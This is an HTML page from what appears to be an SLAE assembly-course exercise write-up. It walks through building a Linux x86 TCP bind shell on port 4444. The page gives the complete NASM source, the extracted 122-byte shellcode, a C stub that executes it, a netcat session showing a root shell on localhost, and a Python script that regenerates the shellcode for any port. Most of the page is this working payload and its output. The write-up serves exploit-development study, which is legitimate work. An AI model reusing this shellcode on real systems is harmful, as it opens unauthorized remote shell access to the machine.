exercise1/README.html

<div id="outline-container-sec-1-6" class="outline-3">
<h3 id="sec-1-6"><span class="section-number-3">1.6</span> Assembly: Take 1</h3>
<div class="outline-text-3" id="text-1-6">
<p>
Lets lookup some values of constants:
</p>

<div class="org-src-container">

<pre class="src src-sh">~/usr/src/linux-headers-4.0.0-kali1-common/include/linux/socket.h~
</pre>
</div>

<div class="org-src-container">

<pre class="src src-c" id="/usr/src/linux-headers-4.0.0-kali1-common/include/linux/socket.h">#define AF_INET   2 /* Internet IP Protocol   */
</pre>
</div>

<p>
I had a hard time finding where <code>SOCK_STREAM</code> was defined so we use
a little gcc magic to see what the macro expands to:
</p>

<div class="org-src-container">

<pre class="src src-sh" id="gcc-macro-expansion">root@blahblah:~/shared/SLAE/slae/exercise1# gcc -DN -E bindshell.c | grep SOCK_STREAM
SOCK_STREAM = 1,
int lsock = socket(2, SOCK_STREAM, 0);
</pre>
</div>

<div class="org-src-container">

<pre class="src src-c" id="/usr/include/netinet/in.h">#define INADDR_ANY ((unsigned long int) 0x00000000)
</pre>
</div>

<div class="org-src-container">

<pre class="src src-nasm" id="bindshellasm.nasm">global _start
;; Note: We will store 2 file descriptors along the way
;; We will put the listening socket file descriptor in edi
;; We will put the connection socket file descriptor in ebx

section .text
  _start:
    ;; Create a socket
    ;; int socketcall(int call, unsigned long *args);
    ;; int socket(int domain, int type, int protocol);
    ;; #define SYS_SOCKET 1   /* sys_socket(2)    */
    ;; Use socketcall to call down to socket
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x1 ; sys_socket syscall number

    ;; Put the socket() args on the stack
    xor ecx, ecx
    push ecx ; Specify protocol as 0
    push ebx ; SOCK_STREAM is the type of socket 1
    push 0x2 ; Domain af_inet sets protocol family to ip protocol 2

    mov ecx, esp ; Save pointer to args for the socket() call
    int 0x80 ; call sys_socket

    ; Save the returned listening socket file descriptor
    xor edi, edi
    mov edi, eax

    ;; Bind the socket
    ;; Use socketcall to call down to socket
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x2 ; sys_bind syscall number

    ;; Start building the sockaddr_in structure
    ;; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ; sin_addr=0 (INADDR_ANY)
    ; INADDR_ANY Accept on any interface 0x00000000
    xor ecx, ecx
    push ecx

    ;; 4444 is 0x115c in little endian. Network byte order is
    ;; Big endian so we swap the byte ordering
    push word 0x5c11 ; sin_port=4444 (network byte order)
    push word bx     ; sin_family=AF_INET (0x2)
    mov ecx, esp     ; move pointer to sockaddr_in structure

    ;; In the initial code we use sizeof to derive the addrlen
    ;; If we print the results of that we get 0x10 which is 16 bytes
    push 0x10 ;addrlen=16
    push ecx  ;struct sockaddr pointer
    push edi  ;sockfd
    mov ecx, esp ;save pointer to bind() args
    int 0x80 ; call sys_bind

    ;; Call listen and prepare for accepting connections
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x4 ; sys_listen syscall number

    ;; Place listen's arguments on the stack
    xor ecx, ecx
    push ecx ; backlog we set to zero
    push edi ; push the socket file descriptor
    mov ecx, esp ; place a pointer to the args in ecx
    int 0x80 ; call sys_listen

    ;; Call accept
    xor eax, eax
    mov al, 0x66 ; socketcall syscall
    xor ebx, ebx
    mov bl, 0x5 ; sys_accept syscall number
    ;; Place accept's arguments on the stack
    ;; We don't need a peer socket???... so we
    ;; use nulls for addrlen and sockaddr struct
    xor ecx, ecx
    push ecx ; Push NULL (0x00000000) for addrlen
    push ecx ; Push NULL (0x00000000) for sockaddr struct
    push edi ; Push the listening sockets file descriptor
    mov ecx, esp ; place a pointer to the args in ecx
    int 0x80 ; call sys_accept

    ;; Save the returned connection socket file descriptor
    xor ebx, ebx
    mov ebx, eax

    ;; Call dup2 for stdin, stdout, and stderr in a loop
    xor ecx, ecx
    mov cl, 0x2 ;loop counter
  dup2:
    mov al, 0x3f ;dup2
    int 0x80
    dec ecx
    jns dup2

    ;; Call execve
    xor eax, eax
    mov al, 0xb ;execve
    xor ebx, ebx
    push ebx
    push 0x68732f2f ;"sh//"
    push 0x6e69622f ;"nib/"
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
</pre>
</div>

<p>
When we compile the above shellcode using the compile.sh script below:
</p>

<div class="org-src-container">

<pre class="src src-sh" id="compile-assembly-script">#!/bin/bash
echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
</pre>
</div>

<p>
<code>root@blahblah:~/shared/SLAE/slae/exercise1# ./compile.sh bindshellasm</code>
</p>

<p>
And run the shellcode using:
</p>

<p>
<code>root@blahblah:~/shared/SLAE/slae/exercise1# ./bindshellasm</code>
</p>

<p>
And connect using netcat:
</p>

<div class="org-src-container">

<pre class="src src-sh" id="netcat-bind-connection">#!/bin/bash
root@blahblah:~/shared/SLAE/slae/exercise1# nc -nv 127.0.0.1 4444
(UNKNOWN) [127.0.0.1] 4444 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
</pre>
</div>

<p>
Bingo! Our assembly works and gives us a tcp bind shell. Now we need to test it
in our c program stub. We will use some command line fu to get the opcodes
from our binary:
</p>

<div class="org-src-container">

<pre class="src src-sh" id="compile-assembly-script">root@funos:~/shared/SLAE/slae/exercise1# objdump -d ./bindshellasm|grep '[0-9a-f]:'| \
grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '\
|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31"
"\xff\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66"
"\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04"
"\x31\xc9\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51"
"\x51\x57\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49"
"\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
</pre>
</div>

<p>
We add our opcodes to a stub tester C program:
</p>

<div class="org-src-container">

<pre class="src src-C" id="shellcode.c">#include&lt;stdio.h&gt;
#include&lt;string.h&gt;

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31"
"\xff\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66"
"\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04"
"\x31\xc9\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51"
"\x51\x57\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49"
"\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\x31\xd2\xcd\x80";


main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

  int (*ret)() = (int(*)())code;

  ret();

}
</pre>
</div>

<p>
Compile with: <code>gcc shellcode.c -o shellcode</code>
Run with: <code>./shellcode</code>
Connect with: <code>nc -nv 127.0.0.1 4444</code>
</p>


<p>
And it works! We get our shell. The shellcode is 122 bytes without
really trying to optimize. We can always go back and try to
optimize. We also need to update the program to make the port number
easily configurable.
</p>

<p>
Let's write a wrapper script to set our port. We just accept the port
as a command line argument to our script and interpolate it into our
shellcode and print out the result:
</p>

<div class="org-src-container">

<pre class="src src-python" id="tcp-bind-shell.py">#!/usr/bin/python

import sys

if len(sys.argv) != 2:
  print "Fail!"

port_number     = int(sys.argv[1])
bts             = [port_number &gt;&gt; i &amp; 0xff for i in (24,16,8,0)]
filtered        = [b for b in bts if b &gt; 0]
formatted       = ["\\x" + format(b, 'x') for b in filtered]
joined          = "".join(formatted)

shellcode ="\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xc9\\x51\\x53\\x6a\\x02\\x89\\xe1"
shellcode+="\\xcd\\x80\\x31\\xff\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x02\\x31\\xc9"
shellcode+="\\x51\\x66\\x68" + joined + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57"
shellcode+="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x04\\x31\\xc9\\x51\\x57"
shellcode+="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x05\\x31\\xc9\\x51\\x51"
shellcode+="\\x57\\x89\\xe1\\xcd\\x80\\x31\\xdb\\x89\\xc3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd"
shellcode+="\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f\\x2f\\x73\\x68"
shellcode+="\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"

print(shellcode)
</pre>
</div>

<p>
Once we have our script we print out our updated shellcode and pop it back
into our shellcode.c stub program, compile and test a connection. When we do,
we get our shell again. And even better, we can change the port to whatever we
would like to yield the proper shellcode.
</p>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="author">Author: Brett Lischalk</p>
<p class="date">Created: 2016-12-21 Wed 15:55</p>
<p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 24.5.1 (<a href="http://orgmode.org">Org</a> mode 8.2.10)</p>
<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
